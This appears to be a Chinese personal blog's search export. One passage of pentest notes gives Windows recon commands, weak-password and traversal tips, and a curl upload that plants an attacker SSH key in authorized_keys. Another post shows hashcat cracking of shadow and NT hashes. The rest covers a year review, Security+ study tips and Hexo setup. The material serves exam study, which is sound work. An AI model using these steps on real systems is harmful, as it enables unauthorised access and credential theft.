</span><br></pre></td></tr></table></figure><p>&#x2F;users目录中存放每个用户的个人目录，&#x2F;users&#x2F;public目录是共享目录，所有人都可以访问、写入，如果需要写入文件，可以在该目录下</p><p>&#x2F;users&#x2F;username&#x2F;Appdata是一个隐藏文件夹，&#x2F;users&#x2F;username&#x2F;Appdata&#x2F;Roaming是在域环境下可能包含用户配置文件的目录</p><p>查看远程目标主机的系统信息（前提是被控机器有目标机器的登录权限，或者知道域的用户名和密码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo /s $hostname</span><br><span class="line">systeminfo /s $hostname domain\user /P password</span><br></pre></td></tr></table></figure><p>查看系统环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure><p>搜索当前目录及子目录的文件(powershell)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir /s $filename</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/p表示循环输出，不一次性输出</span></span><br><span class="line">dir /s *.exe /p</span><br><span class="line">tree /f &gt; tree.txt然后搜索tree.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用forfiles</span></span><br><span class="line">forfiles /p c:\windows /s /m notepad.exe /c &quot;command you want to execute&quot;</span><br></pre></td></tr></table></figure><p>使用whoami查看用户SID，管理员是5000，用户从1001开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\J0ker&gt; whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名                SID</span><br><span class="line">===================== =============================================</span><br><span class="line">desktop-kfa4a5s\j0ker S-1-5-21-2231775247-161512554-3901611509-1001</span><br></pre></td></tr></table></figure><p>查看当前用户权限，属于administrator组就有管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure><p>查看文件权限，（F）表示所有权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls $fileName</span><br></pre></td></tr></table></figure><p>查看运行的所有进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">记得扫目录中的子目录</span><br><span class="line"></span><br><span class="line">现成的EXP不能用的话，记得看漏洞描述</span><br><span class="line"></span><br><span class="line">弱口令试一下用户名和密码都是用户名，使用su切换用户</span><br><span class="line"></span><br><span class="line">如果是固定的那种系统，可以搜默认账号密码，然后拿默认账号去爆破密码</span><br><span class="line"></span><br><span class="line">一定记得看网页源码</span><br><span class="line"></span><br><span class="line">有时候需要切换到普通用户，再拿root</span><br><span class="line"></span><br><span class="line">文件包含可以读取passwd文件然后破解</span><br><span class="line"></span><br><span class="line">进去有phpmyadmin的系统，找数据库配置文件，拿来密码复用</span><br><span class="line"></span><br><span class="line">记得读取passwd文件然后破解</span><br><span class="line"></span><br><span class="line">如果有文件上传，可以考虑上传一个txt之类的文件到.ssh/authorized_keys上去，然后登录（下面的例子实际上是上传之后用filename参数把上传之后的文件名改了）</span><br><span class="line">ssh-keygen</span><br><span class="line">sudo chmod 600 id_rsa</span><br><span class="line">sudo cp id_rsa.pub id_rsa.txt</span><br><span class="line">curl -i -L -X POST -F file=&quot;@/id_rsa.txt&quot; -F filename=”/home/xxx/.ssh/authorized_keys” http://xxx</span><br><span class="line">sudo ssh -oHostKeyAlgorithms=+ssh-dss alfredo@192.168.185.249 -p 25022 -i /home/sinner/Documents/oscp/id_rsa</span><br><span class="line"></span><br><span class="line">直接访问看不到的，curl有时候可以看到</span><br><span class="line"></span><br><span class="line">文件上传可以考虑覆盖.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">目录穿越试一下把/编码，就是%2F，或者改成\，就是%5C</span><br><span class="line"></span><br><span class="line">xfreerdp连不上的话机上/cert-ignore</span><br><span class="line">sudo ip l s dev tun0 mtu 1300(非必要)</span><br><span class="line">sudo proxychains xfreerdp /v:172.16.167.200 /u:luiza /timeout:60000</span><br><span class="line">sudo proxychains xfreerdp /v:172.16.119.200 /u:luiza /cert-ignore /timeout:60000</span><br></pre></td></tr></table></figure><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>内网扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/elddy/NimScan</span><br><span class="line">https://github.com/sh1yan/Lscan</span><br></pre></td></tr></table></figure><p>工具网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyberchef</span><br><span class="line">https://gtfobins.github.io</span><br><span class="line">https://book.hacktricks.xyz/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hashcat破解shadow文件</title>
      <link href="/2024/04/17/%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3shadow%E6%96%87%E4%BB%B6/"/>
      <url>/2024/04/17/%E4%BD%BF%E7%94%A8hashcat%E7%A0%B4%E8%A7%A3shadow%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>在 Linux 系统中，<code>/etc/shadow</code> 是一个存储着用户加密密码和其他相关信息的文件。而 <code>$y$</code> 则是指密码的加密算法类型，也就是哈希函数的标识符。</p><p>在 <code>/etc/shadow</code> 文件中，每个用户的密码都是用一个特定的哈希函数加密的。为了避免密码被轻易破解，Linux 系统会使用不同的哈希函数来加密密码。而 <code>$y$</code> 中的 <code>y</code> 字符则表示使用的是哪种哈希函数，不同的哈希函数对应不同的字符。</p><p>以下是一些常见的 <code>$y$</code> 值及其对应的哈希函数：</p><ul><li><code>$1$</code> 表示使用的是 MD5 哈希函数；</li><li><code>$2$</code> 或 <code>$2a$</code> 表示使用的是 Blowfish 哈希函数；</li><li><code>$5$</code> 表示使用的是 SHA-256 哈希函数；</li><li><code>$6$</code> 表示使用的是 SHA-512 哈希函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.:18443:0:99999:7:::</span><br><span class="line"></span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure><p>其他字段都较好理解，其中加密密码和最后一次修改时间需要解释一下：</p><p>加密密码中如果第一个字符为!或者*的话，说明这是一个不能登录的账户，其他情况格式为$id$salt$encrypted</p><p>根据id可以判断加密方式，第二个$到第三个$之间的字段为salt，第三个$之后的字段为密码hash。</p><p>了解了linux系统密码保存的情况，就可以提取出来使用hashcat破解，我们需要提取第二个冒号到第三个冒号之间的字段保存到一个文件root.txt中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 -a 0 -o result.txt root.txt top100.txt --force</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>掩码破解windows用户密码，查看windows hash的工具非常多，为了省事我直接使用前面文章介绍过的工具LaZagne 就不重复介绍新工具了 <a href="http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/">http://uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p><p>提取到windows hash如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test:1005:aad3b435b51404eeaad3b435b51404ee:f9e37e83b83c47a93c2f09f66408631b:::</span><br><span class="line"></span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>我们需要提取后方的NT-HASH用来破解，即f9e37e83b83c47a93c2f09f66408631b存入test.txt，由于我设置的是三位字母三位数字的密码，使用如下掩码进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 -a 3 -o result4.txt test.txt ?l?l?l?d?d?d --force</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的2023总结</title>
      <link href="/2024/03/31/%E6%88%91%E7%9A%842023%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/31/%E6%88%91%E7%9A%842023%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>想等到security的认证考过了再总结一下吧，现在既然认证已经拿到了，就大概絮叨絮叨，2023年大概是我至今以来目前精神内耗最严重的一年，先是年初跟领导提了想调动，然后被拿捏着去无锡代职，毕竟有了诉求，那就不好跟领导提不想去代职，一呆就是半年，那半年真是卷到起飞，工作日加四天班，周六还得加一天班，没有加班费的那种。无锡那个单位的各方面条件也很差，我住在一楼，宿舍是上世纪九十年代的那种老房子，潮湿不堪，两个人挤在一个十多平的小屋里，窗外的空调噪声巨大，经常大半夜弄的睡不着觉。那段时间被整的很焦虑，一边是调动的事迟迟悬而未决，一边是日复一日的加班，感觉自己就像拉磨的骡子，被吊在眼前的胡萝卜牵着走，躁郁的时候，自己就写写字，也算是把荒废了近十年的一点唯一勉强能称之为特长的手艺给捡了起来，“以后离职了说不定能去兼职带个书法班啥的”当时的我这样自嘲道。</p><p>四月去的无锡，十月才返回北京，然后国庆参加了我最好兄弟的婚礼，感觉一晃十多年过去了，看着别人都成家立业了，自己还是孤身一人飘零如风中柳絮，要说心里没有落差那是不可能的。国庆回去的时候，发现曾经的初中已经搬迁了，旧址被政府计划成一个景点，我心中不以为然，再次重履旧地，锈迹斑斑的篮球架、半米高的杂草、空无一人的凌乱教室，我看着十三年前的那个座位，午后的阳光透过窗户洒在斑驳的墙上，就想起金庸的一句词“红颜弹指老，刹那芳华”，人无法同时拥有青春和对青春的感受，此言不虚，有些东西是再也无法回来了。</p><p>回北京以后，领导提出来想让我去机关干一段时间，有个哥们转岗了，让我顶几个月，并告诉我单位马上要调整了，看能不能找机会把我调动的事解决了，我掂量了掂量既然已经是骑虎难下，那就干吧，投桃报李，想让领导报李，自己不交个投名状哪行呢。于是是焦头烂额地忙到了春节，那段时间基本上技术算是半荒废状态，加班基本上是连轴转，每周要写六份汇报，我跟同事调侃“用形式主义反对形式主义，每周不是在写报告就是在准备素材写报告”。</p><p>春节后，单位调整了，原来的那位领导调走了，走之前他说“调动的事给你联系过了，但是那边的单位说暂时没位置，再等等吧”，经过几个月行政口的经验，这话的弦外之音的意思就是基本上这事以他的层面他算是管不了了。原先年前自己也提前跟用人单位接触过，当时那里表示问题不大，结果年后我再联系的时候，得到的答复也是再等等，因为如果一件事，是真的想帮你办的话，哪怕短时间内办不了，也会说“先等等，下次有个什么什么机会，你关注一下”，而不是只说“再等等”。</p><p>春节休假结束之后，跟新领导提出来想回去干业务，批准了。有那么几天状态很差，毕竟是翘首以盼了一年的调动，最后黄了，要说一点失落没有那是不可能的，但是生活里理想丰满美好、现实一地鸡毛的事情多了去了，自己也只能选择接受或者被迫接受，人有时候得和自己和解。</p><p>回归技术工作之后也是逐渐把手艺拾起来了，其实做网络安全行业的，我也大可不必指着别人赏饭吃，做技术就把技术做好，国际通用的行业，到哪我也饿不着。陆续拿了2个CVE和一些CNVD，并不是拿这些漏洞编号有啥用，个人感觉自己已经过了刷编号的阶段了，只是纯粹检验一下技术还没有完全荒废。</p><p>3月底顺利通过security+的认证，开始准备今年最大的目标，OSCP国际渗透测试专家认证，这也是今年的第二个目标，等这个结了就准备考驾照，大概24年的规划就这三个证书，如果时间充裕，初步计划把OSEP也纳入日程。</p><p>最后，我引用《死亡诗社》里的一句台词，“梭罗曾说’多数人都生活在平静的绝望中，不要逆来顺受，要破茧而出’”，“虽然医药、法律、商业、工程，都是高尚的人生目标，但追求诗意与美、浪漫与爱，却是我们活着的意义”。</p><p>以上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个月时间通过ComptiaSecurity+认证的经验</title>
      <link href="/2024/03/31/%E4%B8%80%E4%B8%AA%E6%9C%88%E6%97%B6%E9%97%B4%E9%80%9A%E8%BF%87ComptiaSecurity-%E8%AE%A4%E8%AF%81%E7%9A%84%E7%BB%8F%E9%AA%8C/"/>
      <url>/2024/03/31/%E4%B8%80%E4%B8%AA%E6%9C%88%E6%97%B6%E9%97%B4%E9%80%9A%E8%BF%87ComptiaSecurity-%E8%AE%A4%E8%AF%81%E7%9A%84%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>从备考到过年到拿证，除去过年的那几天摸鱼和年前工作事情比较多之外，大概就不到一个月时间吧，总的来说考试内容比较基础，就那几块知识，加上自己有相关从业经验，所以备考并不难。</p><p>因为懒得把时间花费在研究怎么报名上，我是直接报的培训课程，因为直播课要等到五月，我就直接刷的题库，着急拿证，毕竟今年计划的重点不在security+证书上，而是后面的OSCP。</p><h1 id="学习的目标"><a href="#学习的目标" class="headerlink" title="学习的目标"></a>学习的目标</h1><p>学习的重点，不用听课程的视频部分，讲那些枯燥的概念，拿证就是要以拿证为导向去学习，直接做题库就行了，可能该方法适合我这种有一些信息安全从业经验的人，小白还是可以听一下的，一共题库900多道题，共21块知识点，涵盖应用程序安全、应急响应、无线安全等安全的大方向，题目偏理解和应用多，网络攻击方法识别那一块的题目我直接略过了，因为本身就是做网络攻击的，所以减轻了一些负担。</p><h1 id="以通过考试为导向去学习"><a href="#以通过考试为导向去学习" class="headerlink" title="以通过考试为导向去学习"></a>以通过考试为导向去学习</h1><p>学习security+，就是以题目为导向，有基础的直接做题就行了，不懂的就Google，不会把概念考的很细，只需要知道这个产品比如RADIUS、RAID、control types，这些都有哪些内容，用于什么现实场景，就可以了，我举几个例子。</p><p>RADIUS，这个在security+里，就是和无线网络的WPA2-enterprise、AAA、Active Directory紧密联系在一起的，一般看到题目里有类似的直接选就行了。</p><p>应用程序白名单，给出的场景里提到用户是通过install、run等方式启动恶意软件的，就选白名单，这个时候答案里有whitelist，必选。</p><p>captive portal，强制门户，可以起到认证用户（authentication）的功能，一般给出的场景里有网络访问的解决方案的时候，答案里有captive portal必选，只有一个例外，使用PKI对设备进行验证，选802.1x。</p><p>如此方法，多总结，就不断地把题库刷明白，做到一眼看到答案就知道要选什么，甚至不用去看题目就知道。</p><p>还有一个tip，就是实在搞不懂这里为什么选该选项的时候，就背下来，比如我这里有个选项不理解，选择用更好的决策点更新剧本（Updating the playbooks with better decision points），我就记住有playbook的必选就行了，因为题库的答案里有playbook这个单词的并不多。</p><h1 id="一定要看英文原题"><a href="#一定要看英文原题" class="headerlink" title="一定要看英文原题"></a>一定要看英文原题</h1><p>考试是全英文的，正式考试之前一定要抛开中文翻译把题目全部过一遍，常见的词汇和关键词汇要牢记，compromised、tenure等等，比如tenure，是任期的意思，有个题目就是怎么调查基于任期的网络犯罪，选mandatory vacation，要是不知道tenure的意思，那就没法做。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>考试一共82道题，满分900分，750分通过，我考了800分，一个半小时考试时间，我基本上30分钟就把题目做完了，除了两三道题不在题库里，其他的全都是很熟练的题目，看到答案直接选的那种，上午9点多考完，晚上就收到了确认邮件，第二天拿到了证书。</p><p>成绩单</p><p><a href="https://smms.app/image/xqc4ydtTbYoViKO" target="_blank"><img src="https://s2.loli.net/2024/03/31/xqc4ydtTbYoViKO.jpg" ></a></p><p>考试通过邮件</p><p><a href="https://smms.app/image/KCgx2ZoJ9NpPt6B" target="_blank"><img src="https://s2.loli.net/2024/03/31/KCgx2ZoJ9NpPt6B.png" ></a></p><p>证书</p><p><a href="https://smms.app/image/tR8axv5NQFwYMp6" target="_blank"><img src="https://s2.loli.net/2024/03/31/tR8axv5NQFwYMp6.png" ></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Experience </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器搭建我的备份gitblog</title>
      <link href="/2024/03/30/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84%E5%A4%87%E4%BB%BDgitblog/"/>
      <url>/2024/03/30/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E6%88%91%E7%9A%84%E5%A4%87%E4%BB%BDgitblog/</url>
      
        <content type="html"><![CDATA[<p>在经历过一次虚拟机down掉然后重装系统，结果虚拟机无法恢复的折腾之后，我的本地笔记又又又丢了，于是打算把blog的环境给放到云上，实现redundancy</p><h1 id="环境搭建及测试"><a href="#环境搭建及测试" class="headerlink" title="环境搭建及测试"></a>环境搭建及测试</h1><p>首先安装git和nodejs环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install git -y</span><br><span class="line">yum install -y nodejs</span><br><span class="line">npm install -g cnpm</span><br><span class="line">npm install -g hexo-cli</span><br><span class="line">mkdir blog</span><br><span class="line">cd blog</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>测试，这里的IP是服务器的内网IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s -i 172.20.255.46 -p 80</span><br></pre></td></tr></table></figure><p>然后就可以通过公网IP访问了</p><h1 id="安装cactus主题"><a href="#安装cactus主题" class="headerlink" title="安装cactus主题"></a>安装cactus主题</h1><p>进入博客所在目录然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/probberechts/hexo-theme-cactus.git themes/cactus</span><br></pre></td></tr></table></figure><p>然后在.&#x2F;_config.yml中修改theme</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: cactus</span><br></pre></td></tr></table></figure><h2 id="添加about页面"><a href="#添加about页面" class="headerlink" title="添加about页面"></a>添加about页面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;about&quot;</span><br></pre></td></tr></table></figure><p>会在根目录的source文件夹下新建about&#x2F;index.md</p><h2 id="在导航栏添加搜索功能"><a href="#在导航栏添加搜索功能" class="headerlink" title="在导航栏添加搜索功能"></a>在导航栏添加搜索功能</h2><p>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml中找到nav 新建search标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: /search/</span><br></pre></td></tr></table></figure><p>执行npm install hexo-generator-search –save</p><p>执行hexo new page search</p><p>进入.&#x2F;themes&#x2F;cactus&#x2F;source&#x2F;serch&#x2F;index.md，修改md文件的头为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: Search</span><br><span class="line">type: search</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>更新之后进入网站，点击search就可以搜索了</p><h2 id="标签功能"><a href="#标签功能" class="headerlink" title="标签功能"></a>标签功能</h2><p>在主题的配置文件中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nav:</span><br><span class="line">  home: /</span><br><span class="line">  about: /about/</span><br><span class="line">  articles: /archives/</span><br><span class="line">  tags: /tags/</span><br><span class="line">  projects: http://github.com/yu1e</span><br><span class="line">  search: /search/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title: Tags and Categories</span><br><span class="line">date: 2017-12-24 23:29:53</span><br><span class="line">tags:</span><br><span class="line">- Foo</span><br><span class="line">- Bar</span><br></pre></td></tr></table></figure><p>然后hexo new page “tags”</p><p>在tags目录下新生成的index.md中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: tags</span><br><span class="line">date: 2024-03-31 13:59:52</span><br><span class="line">type: tags</span><br></pre></td></tr></table></figure><h1 id="更新到github"><a href="#更新到github" class="headerlink" title="更新到github"></a>更新到github</h1><p>首先生成密钥和配置用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;xxx@mail.com&quot;</span><br><span class="line">cat /root/.ssh/id_rsa.pub</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx&quot;</span><br></pre></td></tr></table></figure><p>然后把公钥内容放到GitHub上，再新建一个仓库，这个就不说了，很简单</p><p>测试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>然后改配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/godweiyang/godweiyang.github.io</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tips </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
